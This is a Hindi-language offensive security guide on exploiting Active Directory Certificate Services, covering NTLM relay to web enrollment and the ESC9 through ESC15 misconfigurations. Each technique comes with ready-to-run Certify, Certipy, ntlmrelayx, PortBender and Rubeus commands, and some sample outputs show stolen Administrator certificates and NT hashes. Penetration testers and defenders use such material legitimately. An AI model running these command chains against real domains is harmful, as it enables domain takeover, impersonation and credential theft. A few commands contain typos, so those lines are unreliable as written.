AD CS द्वारा कई **HTTP-based enrollment methods** समर्थित हैं, जो अतिरिक्त server roles के माध्यम से उपलब्ध कराई जाती हैं जो administrators इंस्टॉल कर सकते हैं। HTTP-based certificate enrollment के लिए ये इंटरफेस **NTLM relay attacks** के प्रति संवेदनशील हैं। एक attacker, एक **compromised machine** से, किसी भी AD account की impersonation कर सकता है जो inbound NTLM के माध्यम से authenticate करती है। पीड़ित खाते की impersonation करते समय, attacker इन web interfaces तक पहुँच कर `User` या `Machine` certificate templates का उपयोग करके **client authentication certificate** का अनुरोध कर सकता है।

- **web enrollment interface** (एक पुराना ASP application जो `http://<caserver>/certsrv/` पर उपलब्ध है), default रूप से केवल HTTP पर चलता है, जो NTLM relay attacks के खिलाफ सुरक्षा प्रदान नहीं करता। इसके अलावा यह Authorization HTTP header के माध्यम से केवल NTLM authentication की अनुमति स्पष्ट रूप से देता है, जिससे Kerberos जैसे अधिक सुरक्षित authentication methods अनुपयोगी हो जाते हैं।
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, और **Network Device Enrollment Service** (NDES) default रूप से उनके Authorization HTTP header के माध्यम से negotiate authentication को सपोर्ट करते हैं। Negotiate authentication Kerberos और **NTLM** दोनों का समर्थन करता है, जिससे attacker relay attacks के दौरान authentication को **NTLM** पर downgrade कर सकता है। हालांकि ये web services default रूप से HTTPS सक्षम करते हैं, HTTPS अकेले **NTLM relay attacks** के खिलाफ सुरक्षा प्रदान नहीं करता। HTTPS सेवाओं के लिए NTLM relay attacks से सुरक्षा केवल तभी संभव है जब HTTPS चैनल बाइंडिंग के साथ सम्मिलित हो। दुर्भाग्यवश, AD CS IIS पर Extended Protection for Authentication को सक्रिय नहीं करता, जो कि channel binding के लिए आवश्यक है।

NTLM relay attacks का एक सामान्य मुद्दा NTLM sessions की छोटी अवधि और उस सीमा की वजह से attacker का उन सेवाओं के साथ इंटरैक्ट न कर पाना है जो **NTLM signing** की मांग करती हैं।

फिर भी, इस सीमा को पार किया जा सकता है यदि attacker NTLM relay attack का उपयोग करके user के लिए एक certificate हासिल कर ले, क्योंकि session की अवधि certificate की वैधता अवधि द्वारा निर्धारित होती है, और certificate उन सेवाओं के साथ उपयोग किया जा सकता है जो **NTLM signing** अनिवार्य करती हैं। चोरी किए गए certificate का उपयोग कैसे करें, इसके निर्देश के लिए देखें:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक और सीमा यह है कि **attacker-नियंत्रित मशीन को किसी victim account द्वारा authenticate किया जाना चाहिए**। attacker या तो इंतजार कर सकता है या इस authentication को **force** करने का प्रयास कर सकता है:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **दुरुपयोग**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enabled HTTP AD CS endpoints को सूचीबद्ध करता है:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` property का उपयोग enterprise Certificate Authorities (CAs) द्वारा Certificate Enrollment Service (CES) endpoints संग्रहीत करने के लिए किया जाता है। इन endpoints को टूल **Certutil.exe** का उपयोग करके पार्स और सूचीबद्ध किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify के साथ Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) का दुरुपयोग

Certipy द्वारा डिफ़ॉल्ट रूप से प्रमाणपत्र के लिए अनुरोध `Machine` या `User` टेम्पलेट के आधार पर किया जाता है, यह इस बात से निर्धारित होता है कि रिले किए जा रहे खाते का नाम `$` पर समाप्त होता है या नहीं। वैकल्पिक टेम्पलेट निर्दिष्ट करने के लिए `-template` parameter का उपयोग किया जा सकता है।

[PetitPotam](https://github.com/ly4k/PetitPotam) जैसी तकनीक का उपयोग तब प्रमाणीकरण को मजबूर करने के लिए किया जा सकता है। जब domain controllers से निपटना हो, तो `-template DomainController` निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

नए मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) जो **`msPKI-Enrollment-Flag`** के लिए है, जिसे ESC9 कहा जाता है, प्रमाणपत्र में नए `szOID_NTDS_CA_SECURITY_EXT` सुरक्षा एक्सटेंशन के एम्बेडिंग को रोकता है। यह फ़्लैग तब प्रासंगिक हो जाता है जब `StrongCertificateBindingEnforcement` को `1` (डिफ़ॉल्ट सेटिंग) पर सेट किया गया हो, जो `2` के सेटिंग से भिन्न है। इसका महत्व उन परिदृश्यों में बढ़ जाता है जहाँ Kerberos या Schannel के लिए कमजोर certificate mapping का शोषण किया जा सकता है (जैसे ESC10 में), यह ध्यान देने योग्य है कि ESC9 की अनुपस्थिति आवश्यकताओं को बदलती नहीं है।

उस स्थिति में जब यह फ़्लैग महत्वपूर्ण होता है, उसमें शामिल हैं:

- `StrongCertificateBindingEnforcement` को `2` पर समायोजित नहीं किया गया है (डिफ़ॉल्ट `1` है), या `CertificateMappingMethods` में `UPN` फ़्लैग शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` फ़्लैग के साथ चिह्नित किया गया है।
- प्रमाणपत्र द्वारा किसी भी client authentication EKU का निर्दिष्ट होना।
- किसी भी खाते पर दूसरे खाते से समझौता करने के लिए `GenericWrite` अनुमतियाँ उपलब्ध होना।

### Abuse Scenario

मान लीजिए `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` अनुमतियाँ हैं, जिसका लक्ष्य `Administrator@corp.local` को कम्प्रोमाइज़ करना है। `ESC9` certificate template, जिसमें `Jane@corp.local` को enroll करने की अनुमति है, को उसके `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` फ़्लैग के साथ कॉन्फ़िगर किया गया है।

प्रारंभ में, `Jane` का hash `Shadow Credentials` का उपयोग करके हासिल किया जाता है, `John` के `GenericWrite` के कारण:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` की `userPrincipalName` को `Administrator` में संशोधित किया जाता है, जानबूझकर `@corp.local` डोमेन भाग को छोड़कर:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह परिवर्तन सीमाओं का उल्लंघन नहीं करता है, क्योंकि `Administrator@corp.local` `Administrator` के `userPrincipalName` के रूप में अलग बना रहता है।

इसके बाद, `ESC9` प्रमाणपत्र टेम्पलेट, जिसे vulnerable के रूप में चिह्नित किया गया है, `Jane` के रूप में अनुरोध किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
ध्यान दिया गया कि प्रमाणपत्र का `userPrincipalName` `Administrator` को दर्शाता है, और किसी भी “object SID” से रहित है।

`Jane` का `userPrincipalName` फिर उसकी मूल, `Jane@corp.local`, में वापस कर दिया गया:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जारी किए गए प्रमाणपत्र के साथ प्रमाणीकरण का प्रयास अब `Administrator@corp.local` का NT hash देता है। प्रमाणपत्र में डोमेन निर्दिष्ट नहीं होने के कारण कमांड में `-domain <domain>` शामिल होना चाहिए:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### विवरण

डोमेन कंट्रोलर पर ESC10 दो रजिस्ट्री कुंजी मानों का संदर्भ देता है:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के अंतर्गत `CertificateMappingMethods` का डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`) है, पहले यह `0x1F` था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के अंतर्गत `StrongCertificateBindingEnforcement` का डिफ़ॉल्ट सेटिंग `1` है, पहले `0` था।

**मामला 1**

जब `StrongCertificateBindingEnforcement` को `0` पर कॉन्फ़िगर किया गया हो।

**मामला 2**

यदि `CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है।

### दुरुपयोग मामला 1

यदि `StrongCertificateBindingEnforcement` को `0` पर सेट किया गया है, तो `GenericWrite` permissions वाली किसी अकाउंट A का दुरुपयोग कर किसी भी अकाउंट B को समझौता किया जा सकता है।

उदाहरण के लिए, यदि `Jane@corp.local` पर `GenericWrite` permissions हैं, तो हमलावर `Administrator@corp.local` को समझौता करने का लक्ष्य रख सकता है। प्रक्रिया ESC9 के समान है, जिससे किसी भी certificate template का उपयोग किया जा सकता है।

शुरुआत में, `Jane` का hash `Shadow Credentials` का उपयोग करके, `GenericWrite` का शोषण कर प्राप्त किया जाता है।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` बदलकर `Administrator` कर दिया जाता है, जानबूझकर `@corp.local` भाग हटाया जाता है ताकि किसी प्रतिबंध उल्लंघन से बचा जा सके।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
इसके बाद, क्लाइंट प्रमाणीकरण सक्षम करने वाला एक प्रमाणपत्र डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करते हुए `Jane` के रूप में अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर उसके मूल `Jane@corp.local` पर वापस कर दिया जाता है.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्राप्त प्रमाणपत्र के साथ प्रमाणीकरण करने पर `Administrator@corp.local` का NT hash प्राप्त होगा, प्रमाणपत्र में डोमेन विवरण न होने के कारण कमांड में डोमेन निर्दिष्ट करना आवश्यक है।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### दुरुपयोग मामला 2

यदि `CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) सेट है, तो `GenericWrite` अनुमतियाँ रखने वाला अकाउंट A किसी भी ऐसे अकाउंट B को समझौता कर सकता है जिसकी `userPrincipalName` प्रॉपर्टी नहीं है — इसमें मशीन खाते और बिल्ट-इन डोमेन एडमिनिस्ट्रेटर `Administrator` भी शामिल हैं।

यहाँ लक्ष्य `DC$@corp.local` को समझौता करना है, शुरूआत `Jane`'s हैश Shadow Credentials के माध्यम से प्राप्त करके, और इसके लिए `GenericWrite` का उपयोग किया जाएगा।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
फिर `Jane` का `userPrincipalName` `DC$@corp.local` के रूप में सेट कर दिया जाता है.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
क्लाइंट ऑथेंटिकेशन के लिए एक प्रमाणपत्र डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करके `Jane` के रूप में अनुरोध किया गया है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद मूल मान पर वापस कर दिया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel के माध्यम से प्रमाणित करने के लिए, Certipy का `-ldap-shell` विकल्प उपयोग किया गया, जो प्रमाणन की सफलता को `u:CORP\DC$` के रूप में दर्शाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell के माध्यम से, `set_rbcd` जैसे कमांड Resource-Based Constrained Delegation (RBCD) हमलों को सक्षम करते हैं, जो संभावित रूप से domain controller का समझौता कर सकते हैं।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
यह कमज़ोरी उन किसी भी उपयोगकर्ता खातों तक भी लागू होती है जिनमें `userPrincipalName` नहीं है या जहाँ यह `sAMAccountName` से मेल नहीं खाता। डिफ़ॉल्ट `Administrator@corp.local` एक प्राथमिक लक्ष्य है क्योंकि उसके पास उच्च LDAP अधिकार होते हैं और डिफ़ॉल्ट रूप से `userPrincipalName` अनुपस्थित होता है।

## Relaying NTLM to ICPR - ESC11

### विवरण

यदि CA Server `IF_ENFORCEENCRYPTICERTREQUEST` के साथ कॉन्फ़िगर नहीं है, तो यह RPC सेवा के माध्यम से बिना साइनिंग के NTLM relay हमलों को सक्षम बनाता है। [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

आप `certipy` का उपयोग यह जाँचने के लिए कर सकते हैं कि क्या `Enforce Encryption for Requests` Disabled है, और certipy `ESC11` कमजोरियाँ दिखाएगा।
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### दुरुपयोग परिदृश्य

इसके लिए एक relay server सेटअप करना आवश्यक है:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
नोट: डोमेन कंट्रोलर्स के लिए, हमें DomainController में `-template` निर्दिष्ट करना होगा।

या [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### व्याख्या

प्रशासक Certificate Authority को Yubico YubiHSM2 जैसे बाहरी डिवाइस पर संग्रहीत करने के लिए सेटअप कर सकते हैं।

यदि USB device CA server से USB पोर्ट के माध्यम से कनेक्ट है, या यदि CA server एक virtual machine है तो USB device server के माध्यम से, Key Storage Provider को YubiHSM में keys जनरेट और उपयोग करने के लिए एक authentication key (कभी-कभी "password" कहा जाता है) की आवश्यकता होती है।

यह key/password रजिस्ट्री में `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` के अंतर्गत साफ़ टेक्स्ट में संग्रहीत होता है।

संदर्भ: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### दुरुपयोग परिदृश्य

यदि CA की private key भौतिक USB device पर संग्रहीत है और आपके पास shell access है, तो key को पुनर्प्राप्त करना संभव है।

सबसे पहले, आपको CA certificate (यह public है) प्राप्त करना होगा और फिर:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
अंत में, CA प्रमाणपत्र और उसकी निजी कुंजी का उपयोग करके एक नया मनमाना प्रमाणपत्र बनाने के लिए certutil `-sign` कमांड का उपयोग करें।

## OID Group Link Abuse - ESC13

### व्याख्या

`msPKI-Certificate-Policy` attribute प्रमाणपत्र टेम्पलेट में जारी करने की नीति जोड़ने की अनुमति देता है। `msPKI-Enterprise-Oid` objects जो policies जारी करने के लिए जिम्मेदार हैं, उन्हें PKI OID container के Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) में खोजा जा सकता है। इस object के `msDS-OIDToGroupLink` attribute का उपयोग करके एक policy को AD group से लिंक किया जा सकता है, जिससे सिस्टम उस उपयोगकर्ता को प्रमाणपत्र प्रस्तुत करने पर उस समूह का सदस्य मानकर authorize कर सकता है। [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

दूसरे शब्दों में, जब किसी उपयोगकर्ता के पास प्रमाणपत्र enroll करने की अनुमति होती है और वह प्रमाणपत्र किसी OID group से लिंक होता है, तो उपयोगकर्ता इस समूह के privileges inherit कर सकता है।

OIDToGroupLink खोजने के लिए [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) का उपयोग करें:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### दुरुपयोग परिदृश्य

किसी उपयोगकर्ता अनुमति को खोजें — इसके लिए `certipy find` या `Certify.exe find /showAllPermissions` का उपयोग करें।

यदि `John` के पास `VulnerableTemplate` में enroll करने की अनुमति है, तो वह उपयोगकर्ता `VulnerableGroup` समूह के अधिकार प्राप्त कर सकता है।

उसे बस template निर्दिष्ट करना होगा; उसे OIDToGroupLink अधिकारों वाला एक प्रमाणपत्र मिल जाएगा।
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## कमजोर Certificate Renewal कॉन्फ़िगरेशन- ESC14

### स्पष्टीकरण

विवरण https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping पर काफी विस्तृत है। नीचे मूल पाठ का उद्धरण दिया गया है।

ESC14 उन कमजोरियों को संबोधित करता है जो "weak explicit certificate mapping" से उत्पन्न होती हैं, मुख्य रूप से Active Directory user या computer accounts पर `altSecurityIdentities` attribute के दुरुपयोग या असुरक्षित कॉन्फ़िगरेशन के माध्यम से। यह multi-valued attribute administrators को X.509 certificates को मान्यता उद्देश्यों के लिए किसी AD account के साथ मैन्युअली_ASSOCIATE_ करने की अनुमति देता है। जब यह populated होता है, ये explicit mappings डिफ़ॉल्ट certificate mapping लॉजिक को ओवरराइड कर सकते हैं, जो आमतौर पर SAN में UPNs या DNS names पर, या `szOID_NTDS_CA_SECURITY_EXT` security extension में embedded SID पर निर्भर करता है।

एक "weak" mapping तब होता है जब `altSecurityIdentities` attribute के भीतर उपयोग किया गया string value किसी certificate की पहचान करने के लिए बहुत व्यापक, आसानी से अनुमान लगाने योग्य, गैर-unique certificate fields पर निर्भर, या आसान-से-स्पूफ़ करने योग्य certificate components का उपयोग करता है। यदि कोई Attacker ऐसा certificate प्राप्त कर सकता है या तैयार कर सकता है जिसके attributes किसी privileged account के लिए ऐसे weakly defined explicit mapping से मेल खाते हैं, तो वे उस certificate का उपयोग करके उस account के रूप में authenticate और impersonate कर सकते हैं।

संभावित कमजोर `altSecurityIdentities` mapping strings के उदाहरणों में शामिल हैं:

- केवल एक सामान्य Subject Common Name (CN) द्वारा mapping: उदाहरण के लिए, `X509:<S>CN=SomeUser`. एक Attacker संभवतः कम सुरक्षित स्रोत से इस CN वाला certificate प्राप्त कर सकता है।
- अत्यधिक generic Issuer Distinguished Names (DNs) या Subject DNs का उपयोग बिना किसी और qualification जैसे specific serial number या subject key identifier के: उदाहरण के लिए, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- अन्य अनुमान लगाने योग्य पैटर्न या गैर-क्रिप्टोग्राफिक identifiers का उपयोग जो Attacker किसी certificate में पूरा कर सके जो वे वैध रूप से प्राप्त या forge कर सकते हैं (यदि उन्होंने किसी CA को compromise किया है या ESC1 जैसे vulnerable template को ढूंढ लिया है)।

`altSecurityIdentities` attribute mapping के लिए विभिन्न formats का समर्थन करता है, जैसे:

- `X509:<I>IssuerDN<S>SubjectDN` (पूर्ण Issuer और Subject DN द्वारा मैप करता है)
- `X509:<SKI>SubjectKeyIdentifier` (certificate के Subject Key Identifier extension value द्वारा मैप करता है)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number द्वारा मैप करता है, जो implicitly Issuer DN द्वारा qualified होता है) - यह एक standard format नहीं है, आमतौर पर यह `<I>IssuerDN<SR>SerialNumber` होता है।
- `X509:<RFC822>EmailAddress` (SAN से RFC822 नाम, आमतौर पर ईमेल पता, द्वारा मैप करता है)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate की raw public key का SHA1 hash द्वारा मैप करता है - सामान्यतः मजबूत)

इन mappings की सुरक्षा काफी हद तक चुने गए certificate identifiers की specificity, uniqueness, और cryptographic strength पर निर्भर करती है। भले ही Domain Controllers पर strong certificate binding modes सक्षम हों (जो मुख्यतः SAN UPNs/DNS और SID extension पर आधारित implicit mappings को प्रभावित करते हैं), एक खराब कॉन्फ़िगर किया हुआ `altSecurityIdentities` entry तब भी impersonation के लिए सीधा मार्ग प्रस्तुत कर सकता है यदि mapping logic स्वयं flawed या बहुत permissive हो।

### दुरुपयोग परिदृश्य

ESC14 Active Directory (AD) में explicit certificate mappings, विशेष रूप से `altSecurityIdentities` attribute को लक्षित करता है। यदि यह attribute सेट है (डिज़ाइन या misconfiguration के कारण), तो Attackers उन certificates को प्रस्तुत करके accounts की impersonation कर सकते हैं जो mapping से मेल खाते हैं।

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker के पास target account के `altSecurityIdentities` attribute को लिखने की permissions हैं या target AD object पर निम्नलिखित permissions में से किसी के रूप में इसे grant करने की permission है:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: target के altSecurityIdentities में एक कमजोर X509RFC822 mapping है। Attacker victim का mail attribute ऐसा सेट कर सकता है कि वह target के X509RFC822 नाम से मेल खाए, victim के रूप में certificate enroll कर सकता है, और इस certificate का उपयोग करके target के रूप में authenticate कर सकता है।

#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: target के `altSecurityIdentities` में एक कमजोर X509IssuerSubject explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute सेट कर सकता है ताकि वह target के X509IssuerSubject mapping के subject से मेल खा जाए। फिर, Attacker victim के रूप में certificate enroll कर सकता है, और इस certificate का उपयोग करके target के रूप में authenticate कर सकता है।

#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: target के `altSecurityIdentities` में एक कमजोर X509SubjectOnly explicit mapping है। Attacker victim principal पर `cn` या `dNSHostName` attribute सेट कर सकता है ताकि वह target के X509SubjectOnly mapping के subject से मेल खा जाए। फिर, Attacker victim के रूप में certificate enroll कर सकता है, और इस certificate का उपयोग करके target के रूप में authenticate कर सकता है।

### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
सर्टिफिकेट को सहेजें और कन्वर्ट करें
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
प्रमाणीकरण (सर्टिफिकेट का उपयोग करके)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
सफाई (वैकल्पिक)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### व्याख्या

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc पर दिया गया विवरण बेहद विस्तृत है। नीचे मूल पाठ का उद्धरण दिया गया है।

Built-in default version 1 certificate templates का उपयोग करके, एक attacker CSR तैयार कर सकता है जिसमें application policies शामिल हों जो template में निर्दिष्ट configured Extended Key Usage attributes की तुलना में प्राथमिकता वाली हों। आवश्यकता केवल enrollment rights है, और इसका उपयोग **_WebServer_** template का उपयोग करके client authentication, certificate request agent, और codesigning certificates उत्पन्न करने के लिए किया जा सकता है।

### दुरुपयोग

निम्नलिखित का संदर्भ [इस लिंक]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),क्लिक करके अधिक विस्तृत उपयोग विधियाँ देखें।

Certipy के `find` कमांड से उन V1 templates की पहचान करने में मदद मिल सकती है जो यदि CA unpatched हो तो संभावित रूप से ESC15 के प्रति संवेदनशील हो सकते हैं।
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### परिदृश्य A: Direct Impersonation via Schannel

**कदम 1: एक प्रमाणपत्र का अनुरोध करें, "Client Authentication" Application Policy और लक्षित UPN इंजेक्ट करते हुए।** हमलावर `attacker@corp.local` `administrator@corp.local` को "WebServer" V1 template का उपयोग करके लक्षित करता है (जो enrollee-supplied subject की अनुमति देता है).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: कमजोर V1 टेम्पलेट जिसमें "Enrollee supplies subject" मौजूद है।
- `-application-policies 'Client Authentication'`: CSR के Application Policies extension में OID `1.3.6.1.5.5.7.3.2` डालता है।
- `-upn 'administrator@corp.local'`: SAN में UPN को impersonation के लिए सेट करता है।

**Step 2: प्राप्त प्रमाणपत्र का उपयोग करके Schannel (LDAPS) के माध्यम से प्रमाणीकरण करें।**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### परिदृश्य B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**चरण 1: V1 टेम्पलेट से एक प्रमाणपत्र का अनुरोध करें ("Enrollee supplies subject" के साथ), "Certificate Request Agent" Application Policy इंजेक्ट करते हुए.** यह प्रमाणपत्र attacker (`attacker@corp.local`) के लिए एक enrollment agent बनने हेतु है। यहाँ attacker की अपनी पहचान के लिए कोई UPN निर्दिष्ट नहीं किया गया है, क्योंकि लक्ष्य agent क्षमता प्राप्त करना है.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` को इंजेक्ट करता है.

**Step 2: "agent" certificate का उपयोग करते हुए किसी लक्षित विशेषाधिकार प्राप्त उपयोगकर्ता की ओर से certificate का अनुरोध करें।** यह एक ESC3-like कदम है, और Step 1 से प्राप्त certificate को agent certificate के तौर पर उपयोग किया जाता है।
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
